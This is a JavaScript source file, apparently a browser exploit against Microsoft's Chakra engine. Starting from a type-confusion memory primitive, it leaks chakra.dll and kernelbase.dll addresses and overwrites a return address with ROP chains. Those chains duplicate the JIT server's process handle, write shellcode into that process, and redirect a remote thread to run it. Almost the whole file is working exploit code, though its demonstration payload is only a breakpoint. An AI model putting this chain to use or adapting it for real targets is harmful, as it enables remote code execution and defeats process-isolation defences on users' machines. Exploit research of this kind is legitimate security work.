const hex = (x) => x.toString(16);

function leakChakra(primitive) {
    const vtable = primitive.vtable;
    document.write("[+] vtable: 0x" + hex(vtable.hi) + hex(vtable.lo));
    document.write("<br>");

    const chakra = { lo: vtable.lo - 0x5d0bf8, hi: vtable.hi };
    document.write("[+] chakra.dll: 0x" + hex(chakra.hi) + hex(chakra.lo));
    document.write("<br>");

    return chakra;
}

function leakKernelbase(primitive, chakra) {
    const duplicateHandle = primitive.read64({ lo: chakra.lo + 0x5ee2b8, hi: chakra.hi });
    document.write("[+] duplicateHandle: 0x" + hex(duplicateHandle.hi) + hex(duplicateHandle.lo));
    document.write("<br>");

    const kernelbase = { lo: duplicateHandle.lo - 0x18de0, hi: duplicateHandle.hi };
    document.write("[+] kernelbase.dll: 0x" + hex(kernelbase.hi) + hex(kernelbase.lo));
    document.write("<br>");

    return kernelbase;
}

function leakJitProcHandle(primitive, chakra) {
    const jitProcHandle = primitive.read64({ lo: chakra.lo + 0x74d838, hi: chakra.hi });
    document.write("[+] jitProcHandle: 0x" + hex(jitProcHandle.hi) + hex(jitProcHandle.lo));
    document.write("<br>");

    return jitProcHandle;
}

function findValueByAddress(primitive, address, targetValue, range) {
    for (let offset = range; offset >= 0; offset -= 8) {
        const currentAddress = { lo: address.lo + offset, hi: address.hi };
        const currentValue = primitive.read64(currentAddress);

        if (currentValue.lo === targetValue.lo && currentValue.hi === targetValue.hi) {
            return currentAddress;
        }
    }
}

function leakReturnAddressPointer(primitive, chakra) {
    const type = primitive.type;
    document.write("[+] type: 0x" + hex(type.hi) + hex(type.lo));
    document.write("<br>");

    const javascriptLibrary = primitive.read64({ lo: type.lo + 8, hi: type.hi });
    document.write("[+] javascriptLibrary: 0x" + hex(javascriptLibrary.hi) + hex(javascriptLibrary.lo));
    document.write("<br>");

    const scriptContext = primitive.read64({ lo: javascriptLibrary.lo + 0x430, hi: javascriptLibrary.hi });
    document.write("[+] scriptContext: 0x" + hex(scriptContext.hi) + hex(scriptContext.lo));
    document.write("<br>");

    const threadContext = primitive.read64({ lo: scriptContext.lo + 0x5c0, hi: scriptContext.hi });
    document.write("[+] threadContext: 0x" + hex(threadContext.hi) + hex(threadContext.lo));
    document.write("<br>");

    const leafInterpreterFrame = primitive.read64({ lo: threadContext.lo + 0x8f8, hi: threadContext.hi });
    document.write("[+] leafInterpreterFrame: 0x" + hex(leafInterpreterFrame.hi) + hex(leafInterpreterFrame.lo));
    document.write("<br>");

    // chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    const returnAddressValue = { lo: chakra.lo + 0xd4a73, hi: chakra.hi };
    const returnAddressPointer = findValueByAddress(primitive, leafInterpreterFrame, returnAddressValue, 0x6000);
    document.write("[+] returnAddressPointer: 0x" + hex(returnAddressPointer.hi) + hex(returnAddressPointer.lo));
    document.write("<br>");

    return returnAddressPointer;
}

function buildChakraRopChain(ropBuilder, lpAddressTag, returnAddrTag) {
    const writableAddr = { lo: ropBuilder.chakra.lo + 0x752ff0, hi: ropBuilder.chakra.hi };

    return Array.prototype.concat(
        ropBuilder.VirtualProtect({
            lpAddress: { lo: lpAddressTag, hi: 0xDEADBEEF }, // lpAddress placeholder
            dwSize: { lo: 0x00001000, hi: 0x00000000 },
            flNewProtect: { lo: 0x00000040, hi: 0x00000000 }, // PAGE_EXECUTE_READWRITE
            lpflOldProtect: writableAddr,
        }),
        [
            // Return to shellcode
            ...ropBuilder.popRdiVal({ lo: returnAddrTag, hi: 0xDEADBEEF }), // shellcode address placeholder
            ...ropBuilder.pushRdi(),
        ]
    )
}

function buildStackRopChain(ropBuilder, jitProcHandle, addressesInChakra) {
    const privilegedJitProcHandlePtr = { lo: ropBuilder.chakra.lo + 0x752fe0, hi: ropBuilder.chakra.hi };
    const exShellcodeAddrPtr = { lo: ropBuilder.kernelbase.lo + 0x219e80, hi: ropBuilder.kernelbase.hi };
    const threadHandlePtr = { lo: ropBuilder.kernelbase.lo + 0x219f80, hi: ropBuilder.kernelbase.hi };
    const contextPtr = { lo: ropBuilder.kernelbase.lo + 0x219e88, hi: ropBuilder.kernelbase.hi };
    const contextFlagsPtr = { lo: contextPtr.lo + 0x8, hi: contextPtr.hi };
    const contextRspPtr = { lo: contextPtr.lo + 0x10, hi: contextPtr.hi };
    const retGadget = { lo: ropBuilder.chakra.lo + 0x577fd5, hi: ropBuilder.chakra.hi }; // 0x180577fd5: ret

    // ref: https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
    const pseudoHandle = { lo: 0xffffffff, hi: 0xffffffff }; // pseudo handle (HANDLE)-1
    const NULL = { lo: 0x00000000, hi: 0x00000000 };

    return Array.prototype.concat(
        // elevate handle privileges: https://github.com/googleprojectzero/p0tools/blob/master/JITServer/JIT-Server-whitepaper.pdf
        // process security: https://learn.microsoft.com/windows/win32/procthread/process-security-and-access-rights
        ropBuilder.DuplicateHandle({
            hSourceProcessHandle: jitProcHandle,
            hSourceHandle: pseudoHandle,
            hTargetProcessHandle: pseudoHandle,
            lpTargetHandle: privilegedJitProcHandlePtr,
            dwDesiredAccess: NULL,
            bInheritHandle: NULL,
            dwOptions: { lo: 0x00000002, hi: 0x00000000 } // DUPLICATE_SAME_ACCESS
        }),
        ropBuilder.VirtuaAllocEx({
            hProcessPtr: privilegedJitProcHandlePtr,
            lpAddress: NULL,
            dwSize: { lo: 0x00001000, hi: 0x00000000 },
            flAllocationType: { lo: 0x00003000, hi: 0x00000000 }, // MEM_RESERVE | MEM_COMMIT
            flProtect: { lo: 0x00000004, hi: 0x00000000 } // PAGE_READWRITE
        }),
        [
            // store VirtualAllocEx return address
            ...ropBuilder.popRcxVal(exShellcodeAddrPtr),
            ...ropBuilder.movPtrRcxRax(),
        ],
        ropBuilder.WriteProcessMemory1({
            hProcessPtr: privilegedJitProcHandlePtr,
            lpBaseAddressPtr: exShellcodeAddrPtr,
            lpBuffer: addressesInChakra.shellcodeAddr,
            nSize: { lo: 0x00001000, hi: 0x00000000 },
            lpNumberOfBytesWritten: NULL,
        }),
        ropBuilder.CreateRemoteThread({
            hProcessPtr: privilegedJitProcHandlePtr,
            lpThreadAttributes: NULL,
            dwStackSize: NULL,
            lpStartAddress: retGadget,
            lpParameter: NULL,
            dwCreationFlags: { lo: 0x00000004, hi: 0x00000000, }, // CREATE_SUSPENDED
            lpThreadId: NULL,
        }),
        [
            // store remote ThreadHandle
            ...ropBuilder.popRcxVal(threadHandlePtr),
            ...ropBuilder.movPtrRcxRax(),
        ],
        ropBuilder.WriteProcessMemory2({
            hProcess: pseudoHandle,
            lpBaseAddress: addressesInChakra.lpAddressAddr,
            lpBuffer: exShellcodeAddrPtr,
            nSize: { lo: 0x00000008, hi: 0x00000000, },
            lpNumberOfBytesWritten: NULL,
        }),
        ropBuilder.WriteProcessMemory2({
            hProcess: pseudoHandle,
            lpBaseAddress: addressesInChakra.returnAddr,
            lpBuffer: exShellcodeAddrPtr,
            nSize: { lo: 0x00000008, hi: 0x00000000, },
            lpNumberOfBytesWritten: NULL,
        }),
        ropBuilder.VirtualAlloc({
            lpAddress: NULL,
            dwSize: { lo: 0x000004d0, hi: 0x00000000, }, // sizeof(CONTEXT)
            flAllocationType: { lo: 0x00003000, hi: 0x00000000, }, // MEM_RESERVE | MEM_COMMIT
            flProtect: { lo: 0x00000004, hi: 0x00000000 } // PAGE_READWRITE
        }),
        [
            // store CONTEXT
            ...ropBuilder.popRcxVal(contextPtr),
            ...ropBuilder.movPtrRcxRax(),

            // *contextFlagsPtr = contextPtr+0x30 (ContextFlags)
            ...ropBuilder.addRax10(),
            ...ropBuilder.addRax10(),
            ...ropBuilder.addRax10(),
            ...ropBuilder.popRcxVal(contextFlagsPtr),
            ...ropBuilder.movPtrRcxRax(),

            // *(contextPtr+0x30 (ContextFlags)) = CONTEXT_ALL
            ...ropBuilder.popRcxVal(contextFlagsPtr),
            ...ropBuilder.movRcxPtrRcx(),
            ...ropBuilder.popRaxVal({ lo: 0x0010001F, hi: 0x00000000 }), // CONTEXT_ALL
            ...ropBuilder.movPtrRcxRax(),
        ],
        ropBuilder.GetThreadContext({
            hThreadPtr: threadHandlePtr,
            lpContextPtr: contextPtr
        }),
        [
            // *contextRspPtr = contextPtr+0x98 (Rsp)
            ...ropBuilder.popRcxVal(contextFlagsPtr),
            ...ropBuilder.movRaxPtrRcx(),
            ...ropBuilder.addRax68(),
            ...ropBuilder.popRcxVal(contextRspPtr),
            ...ropBuilder.movPtrRcxRax(),

            // *(contextPtr+0xf8 (Rip)) = retGadget
            ...ropBuilder.addRax60(),
            ...ropBuilder.popRcxVal(retGadget),
            ...ropBuilder.movPtrRaxRcx(),
        ],
        ropBuilder.WriteProcessMemory3({
            hProcessPtr: privilegedJitProcHandlePtr,
            lpBaseAddressPtrPtr: contextRspPtr,
            lpBuffer: addressesInChakra.ropChainAddr,
            nSize: { lo: 0x00000100, hi: 0x00000000 },
            lpNumberOfBytesWritten: NULL,
        }),
        ropBuilder.SetThreadContext({
            hThreadPtr: threadHandlePtr,
            lpContextPtr: contextPtr
        }),
        ropBuilder.ResumeThread({
            hThreadPtr: threadHandlePtr
        })
    )
}

function executeShellcodeInJit(primitive, shellcode) {
    const chakra = leakChakra(primitive);
    const kernelbase = leakKernelbase(primitive, chakra);
    const ropBuilder = new RopBuilder(chakra, kernelbase);

    const shellcodeAddr = { lo: chakra.lo + 0x74b000, hi: chakra.hi };
    primitive.writeValues(shellcodeAddr, shellcode);

    const lpAddressTag = 0xDEADBEE1;
    const returnAddrTag = 0xDEADBEE2;
    const chakraRopChain = buildChakraRopChain(ropBuilder, lpAddressTag, returnAddrTag);

    const chakraRopChainAddr = { lo: shellcodeAddr.lo + shellcode.length * 4 + 0x50, hi: shellcodeAddr.hi };
    primitive.writeValues(chakraRopChainAddr, chakraRopChain);

    const addressesInChakra = {
        shellcodeAddr: shellcodeAddr,
        ropChainAddr: chakraRopChainAddr,
        lpAddressAddr: {
            lo: chakraRopChainAddr.lo + (chakraRopChain.findIndex((v) => v == lpAddressTag)) * 4,
            hi: chakraRopChainAddr.hi
        },
        returnAddr: {
            lo: chakraRopChainAddr.lo + (chakraRopChain.findIndex((v) => v == returnAddrTag)) * 4,
            hi: chakraRopChainAddr.hi
        },
    }

    const jitProcHandle = leakJitProcHandle(primitive, chakra);
    const stackRopChain = buildStackRopChain(ropBuilder, jitProcHandle, addressesInChakra);
    const returnAddressPointer = leakReturnAddressPointer(primitive, chakra);
    primitive.writeValues(returnAddressPointer, stackRopChain);
}

function injectBreakpointIntoJit(typeConfusionPoC) {
    const primitive = new Primitive(typeConfusionPoC);

    const shellcode = [0x909090cc, 0x90909090]; // int 3 | nops
    executeShellcodeInJit(primitive, shellcode);
}
